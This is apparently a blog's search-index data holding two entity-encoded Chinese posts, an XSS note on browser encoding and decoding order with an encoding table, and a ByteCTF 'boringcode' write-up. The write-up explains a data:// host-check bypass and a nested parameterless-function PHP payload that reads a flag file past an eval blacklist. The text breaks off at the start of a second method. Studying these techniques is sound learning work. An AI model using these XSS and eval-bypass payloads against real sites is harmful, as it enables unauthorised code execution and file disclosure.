&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;HTML&#x6807;&#x7B7E;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;&#x6B63;&#x5E38;&#x7684;&#x3002; &#x5F53;&#x89E3;&#x6790;&#x5668;&#x5BF9;&#x524D;&#x8005;(&#x5BF9;&#x6807;&#x7B7E;&#x8FDB;&#x884C;html&#x7F16;&#x7801;)&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x65F6;&#xFF0C;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x4E3A;html&#x6807;&#x7B7E;&#xFF0C;&#x6240;&#x4EE5;&#x6784;&#x5EFA;&#x4E0D;&#x4E86;DOM&#x8282;&#x70B9;&#xFF0C;&#x540E;&#x8005;&#x4E0D;&#x540C;&#xFF0C;&#x4E8E;&#x662F;&#x6210;&#x529F;&#x6784;&#x5EFA;&#x4E86;DOM&#x8282;&#x70B9;&#x3002; &#x800C;&#x5728;&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x5B8C;&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;html&#x89E3;&#x7801;&#xFF0C;&#x4E8E;&#x662F;&#x4E24;&#x8005;&#x90FD;&#x4F1A;&#x89E3;&#x7801;&#x663E;&#x793A;&#x3002; JS&#x7F16;&#x7801;&#xFF1A; &#x4E0D;&#x7BA1;&#x662F;&#x5916;&#x90E8;&#x5F15;&#x7528;&#x8FD8;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5728;script&#x6807;&#x7B7E;&#x91CC;&#xFF0C;&#x53C8;&#x6216;&#x8005;&#x662F;&#x5728;html&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x91CC;&#xFF0C;&#x5BF9;&#x4E8E;js&#x7F16;&#x7801;&#x7684;&#x89E3;&#x7801;&#x90FD;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002; &#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A; 123&lt;script&gt;alert(&quot;Hello World&quot;);&lt;/script&gt; &#x7F16;&#x7801;&#x4E3A;&#xFF1A; 123456789&lt;script&gt;\\u0061lert(&quot;Hello World&quot;);&lt;/script&gt;&#x6216;&lt;script&gt;alert(&quot;\\u0048ello World&quot;);&lt;/script&gt; js&#x7684;&#x811A;&#x672C;&#x5904;&#x7406;&#x6A21;&#x578B;&#x662F;&#x6309;&#x7167; &#x6E90;&#x7801;&#x5904;&#x7406;-&#x51FD;&#x6570;&#x89E3;&#x6790;-&#x4EE3;&#x7801;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x6267;&#x884C;&#x6D41;&#x6765;&#x7684;&#x3002;&#x4E24;&#x79CD;&#x4EE3;&#x7801;&#x90FD;&#x4F1A;&#x7ECF;&#x8FC7;&#x89E3;&#x7801;&#x518D;&#x663E;&#x793A;&#x51FA;&#x6765;&#xFF0C;&#x6240;&#x4EE5;&#x4E24;&#x79CD;&#x6548;&#x679C;&#x90FD;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002; &#x4E0D;&#x80FD;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x66FF;&#x6362;&#x6389;&#x5706;&#x62EC;&#x53F7;&#x6216;&#x5F15;&#x53F7;&#xFF0C;&#x4F1A;&#x5224;&#x5B9A;&#x4E3A;&#x5931;&#x8D25;&#x3002;&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E;JavaScript&#xFF0C;&#x8F6C;&#x4E49;&#x7F16;&#x7801;&#x5E94;&#x5F53;&#x53EA;&#x51FA;&#x73B0;&#x5728;&#x6807;&#x793A;&#x7B26;&#x90E8;&#x5206;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;&#x5BF9;&#x8BED;&#x6CD5;&#x6709;&#x771F;&#x6B63;&#x5F71;&#x54CD;&#x7684;&#x7B26;&#x53F7;&#x3002; HTML + CSS &#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A; 12345678910111213&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;&lt;img src=&quot;y.com&quot; onerror=&quot;alert(2)&quot;/&gt;&lt;p&gt;Hello Parser!&lt;/p&gt;&lt;script&gt;var content = document.getElementById(&quot;content&quot;);var img = document.createElement(&quot;img&quot;);img.src = &quot;x.com&quot;;img.setAttribute(&quot;onerror&quot;,&quot;&amp;#97;lert(1)&quot;);content.appendChild(img);&lt;/script&gt; script&#x811A;&#x672C;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;src=x.com&#x7684;img&#x6807;&#x7B7E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x4F5C;&#x4E3A;id=content&#x7684;div&#x6807;&#x7B7E;&#x7684;&#x5B50;&#x5143;&#x7D20;&#x3002; script&#x811A;&#x672C;&#x4E2D;&#x6539;&#x53D8;&#x4E86;DOM&#x8282;&#x70B9;&#x6811;&#xFF0C;&#x6700;&#x540E;&#x6309;&#x7167;&#x987A;&#x5E8F;&#x89E3;&#x6790;&#xFF0C;&#x5148;&#x54CD;&#x5E94;2&#x540E;&#x54CD;&#x5E94;1&#xFF0C;&#x5982;&#x679C;&#x628A;script&#x6807;&#x7B7E;&#x79FB;&#x5230;img&#x6807;&#x7B7E;&#x4E4B;&#x524D;&#xFF0C;&#x7ED3;&#x679C;&#x76F8;&#x53CD;&#x3002; &#x6D4F;&#x89C8;&#x5668;&#x662F;&#x6309;&#x4E00;&#x79CD;&#x987A;&#x5E8F;&#x6D41;&#x6267;&#x884C;&#x89E3;&#x6790;&#x7684;&#xFF0C;html&#x89E3;&#x6790;&#x5B8C;&#x751F;&#x6210;DOM&#x6811;&#xFF0C;js&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x5BF9;js&#x7F16;&#x7801;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x5BF9;DOM&#x6811;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x5B8C;&#x7684;DOM&#x6811;&#x518D;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x3002; &#x53EF;&#x4EE5;&#x89E6;&#x53D1;JS&#x89E3;&#x6790;&#x5668;&#x7684;&#x65B9;&#x5F0F;&#xFF1A; &#x76F4;&#x63A5;&#x5D4C;&#x5165;&lt; script&gt; &#x4EE3;&#x7801;&#x5757;&#x3002; &#x901A;&#x8FC7;&lt; script sr=&#x2026; &gt; &#x52A0;&#x8F7D;&#x4EE3;&#x7801;&#x3002; &#x5404;&#x79CD;HTML CSS &#x53C2;&#x6570;&#x652F;&#x6301;JavaScript&#xFF1A;URL &#x89E6;&#x53D1;&#x8C03;&#x7528;&#x3002; CSS expression(&#x2026;) &#x8BED;&#x6CD5;&#x548C;&#x67D0;&#x4E9B;&#x6D4F;&#x89C8;&#x5668;&#x7684;XBL &#x7ED1;&#x5B9A;&#x3002; &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x5668;(Event handlers),&#x6BD4;&#x5982; onload, onerror, onclick&#x7B49;&#x7B49;&#x3002; &#x5B9A;&#x65F6;&#x5668;&#xFF0C;Timer(setTimeout, setInterval) eval(&#x2026;) &#x8C03;&#x7528;&#x3002; &#x5E38;&#x7528;&#x7684;&#x7F16;&#x7801;&#x8868; (From s0md3v) HTML Char Numeric Description Hex CSS (ISO) JS (Octal) URL &amp;quot; &#x201C; &amp;#34; quotation mark u+0022 \\0022 \\42 %22 &amp;num; # &amp;#35; number sign u+0023 \\0023 \\43 %23 &amp;dollar; $ &amp;#36; dollar sign u+0024 \\0024 \\44 %24 &amp;percnt; % &amp;#37; percent sign u+0025 \\0025 \\45 %25 &amp;amp; `&amp; &amp;#38; ampersand u+0026 \\0026 \\46 %26 &amp;apos; &#x2018; &amp;#39; apostrophe u+0027 \\0027 \\47 %27 &amp;lpar; ( &amp;#40; left parenthesis u+0028 \\0028 \\50 %28 &amp;rpar; ) &amp;#41; right parenthesis u+0029 \\0029 \\51 %29 &amp;ast; * &amp;#42; asterisk u+002A \\002a \\52 %2A &amp;plus; + &amp;#43; plus sign u+002B \\002b \\53 %2B &amp;comma; , &amp;#44; comma u+002C \\002c \\54 %2C &amp;minus; - &amp;#45; hyphen-minus u+002D \\002d \\55 %2D &amp;period; . &amp;#46; full stop; period u+002E \\002e \\56 %2E &amp;sol; / &amp;#47; solidus; slash u+002F \\002f \\57 %2F &amp;colon; : &amp;#58; colon u+003A \\003a \\72 %3A &amp;semi; ;` &amp;#59; semicolon u+003B \\003b \\73 %3B &amp;lt; &lt; &amp;#60; less-than u+003C \\003c \\74 %3C &amp;equals; = &amp;#61; equals u+003D \\003d \\75 %3D &amp;gt; &gt; &amp;#62; greater-than sign u+003E \\003e \\76 %3E &amp;quest; ? &amp;#63; question mark u+003F \\003f \\77 %3F &amp;commat; @ &amp;#64; at sign; commercial at u+0040 \\0040 \\100 %40 &amp;lsqb; [ &amp;#91; left square bracket u+005B \\005b \\133 %5B &amp;bsol; / &amp;#92; backslash u+005C \\005c \\134 %5C &amp;rsqb; ] &amp;#93; right square bracket u+005D \\005d \\135 %5D &amp;Hat; ^ &amp;#94; circumflex accent u+005E \\005e \\136 %5E &amp;lowbar; _ &amp;#95; low line u+005F \\005f \\137 %5F &amp;grave; ` &amp;#96; grave accent u+0060 \\0060 \\u0060 %60 &amp;lcub; { &amp;#123; left curly bracket u+007b \\007b \\173 %7b &amp;verbar; \\ &amp;#124; vertical bar u+007c \\007c \\174 %7c &amp;rcub; } &amp;#125; right curly bracket u+007d \\007d \\175 %7d &#x603B;&#x7ED3;&#xFF1A;&#x5927;&#x591A;&#x6570;&#x90FD;&#x662F;&#x6458;&#x6284;&#x4E8E;&#x5176;&#x4ED6;&#x6587;&#x7AE0;&#x7684;&#xFF0C;&#x81EA;&#x5DF1;&#x6240;&#x5199;&#x751A;&#x5C11;&#x3002;&#x53EA;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x7B80;&#x8981;&#x7B14;&#x8BB0;&#x7528;&#x4F5C;&#x4EE5;&#x540E;&#x53C2;&#x8003;&#x3002; &#x7F16;&#x7801;&#x8FC7;&#x7A0B;&#x662F;&#x4E00;&#x76F4;&#x90FD;&#x60F3;&#x6574;&#x7406;&#x7684;&#xFF0C;&#x4E5F;&#x662F;&#x5B66;&#x4E60;XSS&#x8FC7;&#x7A0B;&#x4E2D;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x7684;&#x73AF;&#x8282;&#xFF0C;&#x8FD9;&#x7B14;&#x8BB0;&#x4E5F;&#x5C31;&#x7B97;&#x662F;&#x6253;&#x4E0B;XSS&#x7684;&#x4E00;&#x70B9;&#x57FA;&#x7840;&#x4E86;&#x3002; XSS&#x7684;&#x7ED5;&#x8FC7;&#x4E3B;&#x8981;&#x662F;&#x5728;&#x4E8E;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;(&#x76EE;&#x524D;&#x7684;&#x4E00;&#x70B9;&#x62D9;&#x89C1;)&#xFF1A; &#x5BF9;&#x7F16;&#x7801;&#x5185;&#x5BB9;&#x7684;&#x8FC7;&#x6EE4;&#x4E0D;&#x4E25;&#x683C; &#x5BF9;&#x89E3;&#x7801;&#xFF0C;&#x7F16;&#x7801;&#x7684;&#x987A;&#x5E8F;&#x903B;&#x8F91;&#x51FA;&#x9519; &#x5F85;&#x8865;&#x5145;","link":"/2019/01/01/XSS_01_从浏览器编码开始说起/"},{"title":"ByteCTF一道题的分析与学习PHP无参数函数的利用","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x8FD9;&#x6B21;&#x53C2;&#x4E0E;&#x4E86;ByteCTF&#xFF0C;&#x5C1D;&#x8BD5;&#x505A;&#x4E86;boringcode&#x548C;EZCMS&#x3002;&#x867D;&#x7136;&#x90FD;&#x6CA1;&#x505A;&#x51FA;&#x6765;&#xFF0C;&#x4F46;&#x662F;&#x5B66;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002; &#x8FD9;&#x6B21;&#x901A;&#x8FC7;ALTM4NZ&#x5E08;&#x5085;&#x7684;wp&#x6765;&#x5206;&#x6790;&#x4E00;&#x4E0B;boringcode&#x8FD9;&#x9053;&#x9898;&#x5E76;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#x65E0;&#x53C2;&#x6570;&#x51FD;&#x6570;&#x7684;&#x5229;&#x7528;&#x3002; boringcode&#x770B;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A; 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&apos;/data:\\/\\//i&apos;, $url)) { return false; } return true; } return false;}if (isset($_POST[&apos;url&apos;])){ $url = $_POST[&apos;url&apos;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&apos;/baidu\\.com$/&apos;, $r[&apos;host&apos;])) { $code = file_get_contents($url); if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\\((?R)?\\)/&apos;, NULL, $code)) { if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) { echo &apos;bye~&apos;; } else { eval($code); } } } else { echo &quot;error: host not allowed&quot;; } } else { echo &quot;error: invalid url&quot;; }}else{ highlight_file(__FILE__);} &#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x4F5C;&#x7528;&#x662F;&#xFF0C;&#x63A5;&#x53D7;&#x4E00;&#x4E2A;url&#x53C2;&#x6570;&#xFF0C;&#x5229;&#x7528;file_get_content&#x8FDC;&#x7A0B;&#x83B7;&#x53D6;url&#x9875;&#x9762;&#x7684;&#x6E90;&#x7801;&#xFF0C;&#x4F20;&#x9012;&#x7ED9;eval&#x6267;&#x884C;&#x3002;&#x4F46;&#x5728;url&#x4F20;&#x9012;&#x548C;&#x6E90;&#x7801;&#x4F20;&#x9012;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x5404;&#x79CD;&#x68C0;&#x6D4B;&#x3002; &#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#xFF1A; is_valid_url()&#x51FD;&#x6570;&#x6765;&#x68C0;&#x6D4B;url&#x7684;&#x6B63;&#x786E;&#x6027;&#xFF0C;&#x5E76;&#x7981;&#x6B62;&#x4F7F;&#x7528;data&#x534F;&#x8BAE;&#x3002; url&#x7684;host&#x5FC5;&#x987B;&#x4EE5;baidu.com&#x7ED3;&#x5C3E;&#x3002; &#x7ED5;&#x8FC7;&#xFF1A; &#x5982;&#x679C;data&#x534F;&#x8BAE;&#x6CA1;&#x6709;&#x88AB;&#x7ED5;&#x8FC7;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo= &#x6765;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002; &#x8FD9;&#x91CC;&#x628A;data&#x534F;&#x8BAE;&#x7981;&#x6B62;&#x4E86;&#x4E4B;&#x540E;&#xFF0C;&#x60F3;&#x8981;&#x5229;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#x7ED5;&#x8FC7;&#x7684;&#x8BDD;&#x8FD1;&#x4E4E;&#x65E0;&#x89E3;&#x3002;&#x53EA;&#x60F3;&#x5230;&#x8D2D;&#x4E70;&#x57DF;&#x540D;&#x6765;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x6BD4;&#x5982;threezh1baidu.com&#x3002; (&#x8FD8;&#x597D;&#x6CA1;&#x4E70;! &#x4E70;&#x4E86;&#x4E5F;&#x505A;&#x4E0D;&#x51FA;&#x6765;&#x3002;) &#x7B2C;&#x4E8C;&#x4E2A;&#x70B9;&#xFF1A; &#x7531;preg_replace(&apos;/[a-z]+\\((?R)?\\)/&apos;&#x53EF;&#x77E5;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x5141;&#x8BB8;&#x65E0;&#x53C2;&#x6570;&#x7684;&#x51FD;&#x6570;&#x4F20;&#x9012;&#x8FDB;&#x6765;&#x3002;&#x5E76;&#x4E14;&#x51FD;&#x6570;&#x540D;&#x53EA;&#x80FD;&#x4E3A;&#x5B57;&#x6BCD;&#xFF0C;&#x4E0D;&#x80FD;&#x5305;&#x542B;&#x4E0B;&#x5212;&#x7EBF;&#x7B49;&#x5176;&#x4ED6;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002; &#x8FC7;&#x6EE4;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x5173;&#x952E;&#x5B57;&#xFF1A;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log &#x8FD9;&#x91CC;&#x7ED5;&#x8FC7;&#x6CA1;&#x505A;&#x51FA;&#x6765;&#xFF0C;&#x5B66;&#x4E60;&#x5927;&#x4F6C;&#x662F;&#x600E;&#x4E48;&#x505A;&#x8FD9;&#x9898;&#x7684;&#x3002; &#x7ED5;&#x8FC7;&#xFF1A; preg_replace(&apos;/[a-z]+\\((?R)?\\)/&apos;&#x867D;&#x7136;&#x53EA;&#x5141;&#x8BB8;&#x65E0;&#x53C2;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x5141;&#x8BB8;&#x51FD;&#x6570;&#x5957;&#x7528;&#x3002;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x5339;&#x914D;&#x60C5;&#x51B5;&#xFF1A; &#x901A;&#x8FC7;&#x8FD9;&#x6837;&#x7684;&#x5D4C;&#x5957;&#xFF0C;&#x5C31;&#x80FD;&#x6784;&#x9020;&#x51FA;payload&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#xFF0C;&#x5728;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x4E0B;&#x8FD8;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;RCE&#x3002;&#x8FD9;&#x9898;&#x53EA;&#x80FD;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x3002; &#x7B2C;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF1A; &#x53C2;&#x8003;&#xFF1A;ByteCTF_WEB &#x6765;&#x770B;&#x8FD9;&#x4E2A;&#x5E08;&#x5085;&#x7684;Payload&#xFF1A; echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); payload&#x5F88;&#x957F;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x770B;&#x7684;&#x7684;&#x65F6;&#x5019;&#x5413;&#x4E86;&#x4E00;&#x8DF3;&#x3002; &#x6765;&#x770B;&#x770B;&#x4ED6;&#x662F;&#x600E;&#x4E48;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;payload&#x83B7;&#x53D6;&#x5230;flag&#x4E86;&#x5427;&#x3002; &#x56E0;&#x4E3A;&#x73AF;&#x5883;&#x5DF2;&#x7ECF;&#x5173;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x5728;&#x5728;&#x672C;&#x5730;&#x642D;&#x4E86;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x3002; WWW/flag flag&#x6587;&#x4EF6; WWW/code/code.php: 1234567891011121314&lt;?phpif ($_POST[&apos;code&apos;]){ $code = $_POST[&apos;code&apos;]; if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\\((?R)?\\)/&apos;, NULL, $code)) { if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) { echo &apos;bye~&apos;; } else { eval($code); } }else{ echo &quot;No No No&quot;; }}?&gt; &#x5148;&#x6765;&#x770B;&#x8FD9;&#x51E0;&#x4E2A;&#x51FD;&#x6570;&#xFF1A; scandir() &#x5217;&#x51FA; images &#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#x3002; end() &#x5C06;&#x5185;&#x90E8;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x3002; readfile() &#x8F93;&#x51FA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6; scandir()&#x63A5;&#x53D7;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x5730;&#x5740;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5F53;&#x4F20;&#x9012;&#x4E3A;&#x4E00;&#x4E2A;&#x201D;.&#x201D;&#x65F6;&#xFF0C;&#x5219;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x5305;&#x542B;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x76EE;&#x5F55;&#x540D;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x90A3;&#x6784;&#x9020;readfile(end(scandir(&apos;.&apos;)));&#x5C31;&#x4F1A;&#x8BFB;&#x53D6;&#x5230;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x3002; &#x5982;&#x679C;&#x628A;&#x51FD;&#x6570;&#x53C2;&#x6570;&#x68C0;&#x6D4B;&#x5173;&#x6389;&#x7684;&#x8BDD;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x5185;&#x5BB9;&#x4E3A;code.php&#x7684;&#x6E90;&#x7801;&#xFF1A; &#x8FD9;&#x9898;&#x56E0;&#x4E3A;&#x4E0D;&#x80FD;&#x9644;&#x5E26;&#x53C2;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x5BFB;&#x627E;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x80FD;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x201D;.&#x201D;&#x3002;&#x4E8E;&#x662F;&#x627E;&#x5230;&#x4E86; localeconv() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x5305;&#x542B;&#x672C;&#x5730;&#x6570;&#x5B57;&#x53CA;&#x8D27;&#x5E01;&#x683C;&#x5F0F;&#x4FE1;&#x606F;&#x7684;&#x6570;&#x7EC4;&#x3002; &#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4F1A;&#x8FD4;&#x56DE;&#xFF1A; array(18) { [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; [&quot;int_curr_symbol&quot;]=&gt; .... &#x6570;&#x7EC4;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x503C;&#x5C31;&#x662F;&#x201D;.&#x201D;&#x3002;&#x518D;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x6784;&#x9020;:current(localeconv())&#x6216;&#x8005;pos(localeconv())&#x3002;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x8FD8;&#x8FC7;&#x6EE4;en&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x9009;&#x62E9;&#x4E86;&#x540E;&#x8005;&#x3002; current() &#x8FD4;&#x56DE;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5F53;&#x524D;&#x5355;&#x5143;, &#x9ED8;&#x8BA4;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x503C; pos() current() &#x7684;&#x522B;&#x540D; &#x8FD9;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E86;,payload&#x4E3A;&#xFF1A; readfile(end(scandir(pos(localeconv())))); &#x56E0;&#x4E3A;flag&#x662F;&#x5728;&#x4E0A;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x4F7F;&#x7528;chdir() next()&#x6765;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x4E00;&#x4E0B;php&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF0C;&#x518D;&#x4F7F;&#x7528;readfile&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x3002; chdir() &#x51FD;&#x6570;&#x6539;&#x53D8;&#x5F53;&#x524D;&#x7684;&#x76EE;&#x5F55;&#x3002; next() &#x51FD;&#x6570;&#x5C06;&#x5185;&#x90E8;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x3002; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;scandir()&#x8FD4;&#x56DE;&#x7684;&quot;..&quot; &#x5C06;&#x76EE;&#x5F55;&#x5B9A;&#x4E49;&#x4E3A;&#x4E0A;&#x4E00;&#x76EE;&#x5F55;&#xFF1A;chdir(next(scandir(pos(localeconv())))) &#x4F46;&#x662F;chdir()&#x51FD;&#x6570;&#x6267;&#x884C;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF0C;&#x53EA;&#x4F1A;&#x8FD4;&#x56DE;&#x201D;1&#x201D;&#x3002; &#x5982;&#x524D;&#x9762;&#x8BFB;&#x6587;&#x4EF6;&#x4E00;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x201D;.&#x201D;&#x6765;&#x8BFB;&#x53D6;flag&#x3002; ALTM4NZ&#x5E08;&#x5085;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5F88;&#x9A9A;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5C31;&#x662F;&#x4F7F;&#x7528;localtime()&#x914D;&#x5408;chr&#x6765;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x201D;.&#x201D;&#x3002; localtime() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x672C;&#x5730;&#x65F6;&#x95F4;&#x3002;&#x8FD4;&#x56DE;&#x7684;&#x7C7B;&#x578B;&#x4E3A;&#x5173;&#x8054;&#x6570;&#x7EC4; &#x5173;&#x8054;&#x6570;&#x7EC4;&#x7684;&#x952E;&#x540D;&#x5982;&#x4E0B;&#xFF1A; [tm_sec] - &#x79D2;&#x6570; [tm_min] - &#x5206;&#x949F;&#x6570; [tm_hour] - &#x5C0F;&#x65F6; ... chr() &#x51FD;&#x6570;&#x4ECE;&#x6307;&#x5B9A;&#x7684; ASCII &#x503C;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x3002; &#x83B7;&#x53D6;&#x201D;.&#x201D;&#x7684;payload&#xFF1A;chr(pos(localtime())) &#x5F53;&#x65F6;&#x95F4;&#x4E3A;&#x67D0;&#x4E00;&#x5206;&#x949F;&#x7684;46&#x79D2;&#x65F6;, pos(localtime())&#x8FD4;&#x56DE;46&#x3002;46&#x662F;&#x201D;.&#x201D;&#x7684;ASCII&#x7801;&#x503C;&#x3002;&#x6240;&#x4EE5;payload&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#x201D;.&#x201D; &#x4F46;&#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;localtime()&#x53C2;&#x6570;&#x53EA;&#x63A5;&#x53D7;&#x65F6;&#x95F4;&#x6233;&#x3002; &#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x4F7F;&#x7528;time()&#x6765;&#x89E3;&#x51B3;&#x3002;time()&#x4E0D;&#x4F1A;&#x53D7;&#x53C2;&#x6570;&#x7684;&#x5F71;&#x54CD;&#x5E76;&#x4E14;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x6233;&#x3002; &#x81F3;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x7684;payload&#x5C31;&#x4E3A;&#xFF1A; chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) &#x5728;46&#x79D2;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#x201D;.&#x201D; &#x518D;&#x7528;&#x524D;&#x9762;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x6BCF;&#x5206;&#x949F;&#x7684;46&#x79D2;&#x65F6;&#x8BFB;&#x53D6;&#x5230;flag&#x4E86;&#x3002; echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); &#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x5F0F; 